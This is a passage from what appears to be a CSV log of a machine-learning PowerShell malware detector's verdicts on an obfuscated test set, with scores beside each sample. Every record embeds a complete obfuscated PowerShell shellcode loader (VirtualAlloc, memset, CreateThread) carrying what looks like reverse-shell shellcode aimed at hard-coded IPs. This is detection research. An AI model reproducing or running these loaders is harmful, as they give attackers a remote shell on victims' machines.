s','0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0','df,0xe0,0xff,0xd5,0x97,0x6','x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4','ernel32.dllpTK)]public static extern IntPtr VirtualAlloc(IntPtr lpAddress',',0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x','0','0f,0x','cf,0x0','0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00','if (1gzz.Length -gt 0x1000){1gzg = 1gzz.Length};1gzx=1gzw::VirtualAlloc(0',',0x57,',',0x6','mport(pTKkernel32.dllpTK)]',',0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0',',0x4b,0x8b,0x58,0x1c','5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;1gzg = 0x1000;','d(0,',',0','a,0x10,0x56,0x5',',0','20,0xc1,0x',', uint flAl','x30,0',', uint d','ngth-1);1gzi++) {1gzw::memset([IntPtr](1gzx.ToInt32()+1gzi), 1gzz[1gzi], 1)};1gzw::','locationType, uint flProtect);[DllI','te[]]1gzz = 0xfc,0xe8,0x89,0x00,0x00,0x',',0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c','53,0','CreateThrea','6','xff,0xd5,0x50,0x','000,1gzg,0x40);for (1gzi=0;1gzi -le (1gzz.Le','espace Win32Functions -passthru;[Byte[]];[By','x1','rc, uint count);tlL;1gzw = Add-Type -memberDefinition 1gzc -Name pTKWin32pTK -nam',',0x31,0xff,0x31,0xc','a,0x05,0x68,0xc0,0xa8,0x00,0x10,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6','7,0xff,0xd5,0xb8,0x90,0x01,0x','0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,',',0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd','0x49,0x8b,0x34,0x8b,0x01,0xd6','7,0x68,0x99,0xa5,0x74,0x61,','50,0x8b,','0,0xac,0xc1,0xc','xff,0xd5,0x6a,0x00,0x6a,0x04,0x5',',0x56,0x6a,0x00,0x68,0x58,0xa4,0x','DllImport(pTKk','8b,0x52,0x0c,','00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0','f,0x0d','public static extern IntPtr CreateThread(IntPtr','50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x','x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,')).replACe(([cHaR]49+[cHaR]103+[cHaR]122),'$').replACe(([cHaR]112+[cHaR]84+[cHaR]75),[StRing][cHaR]34).replACe(([cHaR]116+[cHaR]108+[cHaR]76),[StRing][cHaR]39))",malicious,TP
2026-07-13 17:22:11,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\61.ps1,custom-ps-ml,UNKNOWN,18599167-ce35-4620-ab0e-fc97c4ad3928,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,3015,1616.48,"(((\""{32}{13}{45}{16}{17}{38}{20}{4}{7}{6}{27}{39}{50}{19}{40}{10}{26}{0}{11}{15}{12}{48}{18}{14}{46}{43}{44}{8}{24}{49}{34}{25}{41}{5}{21}{31}{33}{23}{28}{2}{9}{1}{36}{22}{47}{3}{29}{37}{30}{35}{42}\""-f'1,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd','0x75,0xc7,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd','0xff,0xd5,0x5e,0x5e,0xff,0x0c,0x24,0xe9,0x71,0xff,','r](K0','tr CreateTh','6,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0','s, uint','read(IntPtr lpThreadAttribute','x74,0x61,0xff,0xd5,0x85,0xc0','0xff,0xff,0x01,0xc3,0x29,0xc6,',',0','3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0',',0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x','public stat','d5,0x6a,0x05,0x68,0','xc1,0xcf','VirtualAlloc(IntPtr lpAddress, uint dwSize,',' uint flAllocati','0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0x','2Win323K2 -namespace Win32Functions -passthru;[Byte[]];[Byte[]]K0Mz = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7','tic extern IntP','xff,0xd5,0x93,0x53,0x6a,0x00,0x5','x1000;if (K0Mz.Lengt','d5,0x57,0x68,0x75,0x6e,0x4d,0x6',',0x74,0x0a,0xff,',',0x','x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x1',' dwStackSize, IntPtr lpStartAddress, IntPtr lpP','1,','Mx.ToInt32()+K0Mi), K0Mz[K0Mi], 1)};K0Mw::CreateThread(0,0,K0M',',','6,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0','K0Mc = KhN[DllImport(3K2kernel32.dll3K2)]','x00,0x7d,0x22,0x58,0x68,0x00,0x40,0x00,0x00,0x6a,0x00,0x50,0x68,0x0b,0x2f,0x0f,0x30,0xff,0x','x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e','0,0);for (;;){S','5;K0Mg = 0','x,0','onType, uint flProtect);[DllImport(3K2kernel32.dll3K2)]public sta','arameter, uint dwCreationFlags, IntPtr lpThreadId);[Dll',',0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2','3','tart-sleep 60};','00,0x11,0x5c,0x89,0xe6,0x50,0x50,0x50,0x50,0x4','0,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0','ic extern IntPtr ','xbc,0x30,0x50,0xeb,0x68,0x02,0x','h -gt 0x1000){K0Mg = K0Mz.Length};K0Mx=K0Mw::VirtualAlloc(0,0x1000,K0Mg,0x40);for (K0Mi=0;K0Mi -le (K0Mz.Length-1);K0Mi++) {K0Mw::memset([IntPt','3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,','0x4e,0x08,0x75,0xec,0xe8,0x61,0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,0x56,0','Import(3K2msvcrt.dll3K2)]public static extern IntPtr memset(IntPtr dest, uint src, uint count);KhN;K0Mw = Add-Type -memberDefinition K0Mc -Name 3K')) -CREPlaCe 'KhN',[ChaR]39  -rEPLAce '3K2',[ChaR]34 -rEPLAce([ChaR]75+[ChaR]48+[ChaR]77),[ChaR]36) |.( $VeRBOsEpReFerEnCe.ToStRINg()[1,3]+'X'-jOin'')",malicious,TP
2026-07-13 17:22:24,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\619.ps1,custom-ps-ml,UNKNOWN,b775e614-ce7a-4c92-a018-ac4896535168,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,2690,1774.03," INvOkE-ExPREssioN((((\""{20}{4}{42}{7}{15}{31}{1}{21}{22}{8}{11}{14}{41}{0}{27}{39}{18}{19}{12}{10}{33}{45}{5}{17}{40}{44}{13}{30}{23}{35}{26}{28}{25}{16}{36}{9}{37}{32}{6}{29}{34}{43}{38}{24}{2}{3}\"" -f'fc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89','Flags, Int','::memset([IntPtr](Decx.ToInt32()+Deci), Decz[Deci], 1)};Decw::CreateThread(0,0,Decx,0,0,0);for (;;){Start-sleep ','60};','ize,','xd6,0x31,0xff,0','xd5,0x',' flAllocationType, uint flProtect);[','t;De','04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b','x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x2','c','3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0','x01,0xd3','w = Add-Type -memberDefinition Decc -Name 4LNWin324LN -namespace Win32Function','DllImport','f,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec','xac,0xc1,0xcf,0x0d,0x01,0xc7,0x',',0xc0,0x64,0x8b,0x50,0x30,0','x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x','Decc = 6et[DllImport(4LNkernel32.dll4LN)]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwS','Ptr lpThreadId);[DllImport(4LNmsvcrt.dll4LN)]public static extern IntPtr memset(IntPtr de','st, uint src, uint count);6e','8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68','ecz.Length-1);Deci++) {Decw','40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x8d,0xff,0x94,0xcb,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xf','0x6b,0x00,0xff,0xd5,0x50,0x50,',',0xe5,0x3','0x50,0x50,0x','93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x',',0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x','(4LNkernel32.dll4LN)]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreation','a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0','0,0x','01,0',',0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,',',0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x',',0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6','75,0xee,0xc3;Decg = 0x1000;if (Decz.Length -gt 0x1000){Decg = Decz.Length};Decx=Decw::VirtualAlloc(0,0x1000,Decg,0x40);for (Deci=0;Deci -le (D','1','38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x','s -passthru;[Byte[]];[Byte[]]Decz = 0x',' uint','xc3,0x29,0xc6,0x','7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0','01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0')) -crePLAce ([CHar]54+[CHar]101+[CHar]116),[CHar]39-REpLacE 'Dec',[CHar]36-crePLAce'4LN',[CHar]34))",malicious,TP
2026-07-13 17:22:37,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\629.ps1,custom-ps-ml,UNKNOWN,f8c8b782-d3a6-45af-8085-ad1354a8088c,DESKTOP-BAC9DBQ,malicious,0.9867,RandomForest,2965,1606.58,"((\""{5}{14}{51}{54}{69}{30}{52}{23}{37}{27}{41}{22}{60}{61}{64}{20}{47}{68}{34}{17}{65}{53}{43}{67}{62}{31}{36}{21}{0}{66}{44}{38}{56}{63}{2}{6}{1}{25}{15}{16}{40}{10}{35}{55}{50}{33}{58}{9}{46}{19}{32}{8}{29}{59}{3}{4}{49}{18}{48}{24}{12}{28}{13}{42}{7}{57}{39}{11}{26}{45}\""-f'x01,0xd3,0xe3,0','0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1','xe0,0x75','8,0xa4,0x53,0xe5,0xff,0xd5',',0x93,0x5','4ruc = 16l[DllImport(D13kernel32.dllD13)]public static e',',0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,','alAlloc(0,0x1000,4rusize,0x40);fo','8,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,',',0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x','68,0x4c,0x77,0x26,0x07,','i), 4rusc[4rui], 1)};4ruw::CreateThread(0,0,',',0x85,0xf6,0x75,0xec,0xc3;4ru','c.L','xtern I','61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,','0x00,',',0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0',',0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0','xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6','me D13Win32D13 -namespace Win32Functions -passth','74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0','rc, uint count)',' CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(D13ms','c6','c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x','4rux,0,0','r ','size = 0x1000;if (4rusc.Length -gt 0x1000){4rusize = 4rus','0x6a,0x00,0x68,0','kernel32.dllD13)]pu','0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,','a,0x04,0x56,0x57,0x6','40,0x50,0x68,0xea,0x0f,0xdf,0xe0','xe5,0x31,0xd2,0x64','0xff,0xd5,0x','0x40,0x78,0x85,0xc0,0x','vcrt.dllD13)]public static extern IntPtr memset(IntPt','xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7','ntPtr](4rux.ToInt32()+4ru','0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x','dest, uint s','ength};4rux=4ruw::Virtu','x31,0xc0,0xac,0x3c,0x61,',',0xff,0x31,0',',0);for (;;){Start-sleep 60};','99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0','ru;[Byte[]];[Byte','x01,0xc3,0x29,0x','3,0x6a,0x00','0,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x','ntPt','blic static extern IntPtr','xff,0','r VirtualAlloc(In','b8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x8',',0x','r (4rui=0;4rui -le (4rusc.Length-1);4rui++) {4ruw::memset([I',',0xff,0xd5,0x97,0x6a,0x05,0x68,0x0a,0x0a,0x01,0x96,0x68,0x02,0x00,0x01','x5',';16l;4ruw = Add-Type -memberD','efinition 4ru','xcf,0x0d,0x01,0xc7,0xe2,0xf0,','38,0','c -Na','x31,0','x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31','0x7c,0x02,0x2c,0x20,0xc1,0','[]]4rusc = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0','tPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(D13')).REplACE('D13',[String][ChaR]34).REplACE('4ru',[String][ChaR]36).REplACE(([ChaR]49+[ChaR]54+[ChaR]108),[String][ChaR]39)|. ((gET-vARiablE '*mdR*').NaME[3,11,2]-JoIn'')",malicious,TP
2026-07-13 17:22:50,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\66.ps1,custom-ps-ml,UNKNOWN,e4eed5a3-47fc-463d-a229-232e74dc6e9e,DESKTOP-BAC9DBQ,malicious,0.9867,RandomForest,2965,1611.47," ((\""{48}{21}{24}{33}{0}{34}{40}{32}{3}{6}{58}{66}{61}{27}{16}{14}{54}{29}{10}{64}{12}{50}{65}{60}{37}{17}{42}{43}{59}{35}{38}{5}{20}{23}{68}{18}{31}{15}{30}{47}{4}{67}{44}{56}{19}{46}{45}{55}{7}{53}{1}{52}{2}{8}{25}{41}{57}{62}{36}{69}{9}{49}{22}{63}{28}{26}{39}{13}{51}{11}\"" -f't);[DllImpor',',0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0','x00,0x5','eadAttributes, uint dwStackSize, IntPtr lpStartAddre','0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0','0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x','ss, IntPtr lpPar','74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5','6,0x6a,0x00,0x68,0x58,0xa','0,0x1000,n26g,','xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0','rt-sleep 60};','4,0x8b,','or (;;','5Zmsvcrt.dll05Z)]p','77,0x73,0x32,0x5','Id);[DllImport(0','b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,','f,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x','05,0x68,','3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x5','c = oTJ[DllImport(05Zkernel','i -le (n26z.Length-','8,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0x','32.dll05Z)]public static extern IntPtr VirtualAlloc(IntPtr lpAddress','4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x','n26i), n26z[n26i], 1)};n26w::Cr','tionFlags, IntPtr lpThread','](n26x.ToInt32()+',';[Byte[]]n26z = 0xfc,0','f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x','68,0x',' lpThr',', uint dwSize, uint flAllocationType, uint flProtec','t(05Zkernel','6,0x31,0xff,','= 0x1000;if (n26z.Length -gt 0x1000){n26g = n26z.Length};n26x=n2','0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8','0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,','eateThread(0,0,n26x,0,0,0);f','32.dll05Z)]public static extern IntPtr CreateThread(IntPtr','00,0x56,0x53,0x57,0x','0x','49,',',0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0','00,0','0xc0,0xa8,0x01,0x22,0x68,0x02,0x','29,','n26','0x40);for (n26i=0;n26','0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0','){Sta','xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0',',0xa2,0x56,0xff,0xd5,0x6a,0x00','ublic static extern IntPtr memset(IntPtr dest, uint src, uint count);oTJ;n26w = Add-Type -memberDefinition n26c -Name 05ZWin3205Z -namespace Win32Functions -passthru;[Byte[]]','x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x','xe0,0xff,0xd5,0x97,0x6a,0x','68,0x','amet','0x8b,0x34,0x8b,0x01,0xd','x3c,0x61,0x7c,0x02,0x2c,0x20,',', uint dwCrea','02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;n26g ','1);n26i++) {n26w::memset([IntPtr','xd2,0x6','x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0','er','xd5,0x50','f','6w::VirtualAlloc(')).RePlAcE(([char]48+[char]53+[char]90),[sTRiNg][char]34).RePlAcE('oTJ',[sTRiNg][char]39).RePlAcE(([char]110+[char]50+[char]54),[sTRiNg][char]36)|.((gv '*Mdr*').NAME[3,11,2]-Join'')",malicious,TP
2026-07-13 17:23:02,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\67.ps1,custom-ps-ml,UNKNOWN,825fe3e0-fea6-4b67-a278-1a289845052d,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,2780,1634.43,".( $Env:cOMspec[4,26,25]-jOin'') ( (((\""{35}{37}{42}{40}{6}{21}{41}{10}{28}{27}{26}{33}{1}{45}{25}{36}{38}{22}{18}{29}{2}{46}{16}{44}{3}{13}{23}{17}{30}{5}{39}{15}{34}{9}{14}{0}{12}{8}{24}{11}{7}{32}{31}{19}{4}{20}{43}\""-f ',0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x5','ac,0x3c','0xc',',0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x0','Bx=lfBw::VirtualAlloc(','0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,','uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCr','d9,0','0x93,0x53,0x6a,0x00,0x56,','8,0x99,0xa5,0x74,0x61,0xff,0xd5','dest, uint src, uint count);w38;lfBw = Add-Type -memberDefinition lfBc -Name 8NYWin328NY -namespace Win32Functions -pa','2,0x','7,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,','4,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x6',',0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0','7,0xff,0xd5,0','01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x','x51,','xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac','ength};lf','0,0x1000,lfBg,0x40);for (lfBi=0;lfBi -le (lfBz.Length-1);lfBi++) {lfBw::memset([IntPtr](lfBx.ToInt32()+lfBi), lfBz[lfBi], 1)};lfBw::CreateThread(0,0,lfBx,0,0,0);fo','eationFlags, IntPtr lpThreadId);[DllImport(8NYmsvcrt.dll8','x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0','1,0x59,0x5a,0','0x53,0x57,0x68,0x0','0x01,0xc7,0xe2,0xf','4,0x8b,0x72,0x28,0x0f,0xb7,0x4a,','0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x1','ssthru;[Byte[]];[Byte[]]lfBz = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,',',','0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,','00){lfBg = lfBz.L','xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;lfBg = 0x1000;if (lfBz.Length -gt 0x10','0x26,0x31,0xff,0x31,0xc0,0x','xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x58,0xaf,0x16,0x09,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x6','lfBc = w38[DllImport(8NYkernel32.dl','0,0x52,0x57,0x8b,0x52,0x10,','l8NY)]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect','0x8b,0x42,0x3c,0x01,0xd0,0x8b,0','0x54,0x68,0x4c,0x77,0x26,0x0','8NY)]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, ','NY)]public static extern IntPtr memset(IntPtr ',');[DllImport(8NYkernel32.dll','r (;;){Start-sleep 60};','01,0xd3,0x66,0x8b,0x0c',',0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,','1,0xcf,0x0d,0x'))  -crepLace([Char]119+[Char]51+[Char]56),[Char]39-RePLaCe([Char]108+[Char]102+[Char]66),[Char]36-RePLaCe'8NY',[Char]34))",malicious,TP
2026-07-13 17:23:16,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\680.ps1,custom-ps-ml,UNKNOWN,0cec554a-eccb-43bb-bc78-3c9bf0b3e44f,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,2760,1550.82," (((\""{8}{31}{25}{37}{40}{39}{6}{35}{3}{13}{30}{18}{10}{9}{45}{5}{23}{34}{27}{28}{7}{19}{17}{46}{22}{20}{41}{43}{32}{1}{16}{2}{33}{21}{29}{44}{15}{26}{12}{14}{4}{38}{36}{42}{0}{11}{24}\"" -f '4','0,','0x57,0x68,0x99,0xa5,0x74,0x61,0x',' IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(jIRmsvcrt.dlljIR','0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0',' Win32Functions -passthru;[Byte[]];[Byte[]]4w0z ','tPtr','ac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc','4w0c = fKy[D','e -memberDefinition 4w0c -N','nt src, uint count);fKy;4w0w = Add-Typ','w0w::CreateThread(0,0,4w0x,0,0,0);for (;;){Start-sleep 60}','x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4',')]public ',',0x53,0xe5,0xff,0xd5,0x93,','x','0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x38,0x83,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,','0,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0','tPtr dest, ui','1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x5','x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8','xff,0xd5,','34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0','= 0xfc,0xe8,0x89,0x00,0x00,0',';','Import(jIRkernel32.dlljIR)]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(','8b,0x36,0x6a,0x40,0x68,0','4,0x8b',',0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0x','0x6a,0x00,0x6a,0x04,0','static extern IntPtr memset(In','ll','4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x4','ff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0','x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x1',' lpStartAddress,','6,0x85,0xf6,0x75,0xec,0xc3;4w0g = 0x1000;if (4w0z.Length -g','jIRkernel32.dlljIR)]public','xd5,0x01,0xc3,0x29,0xc','rn IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, In',' static 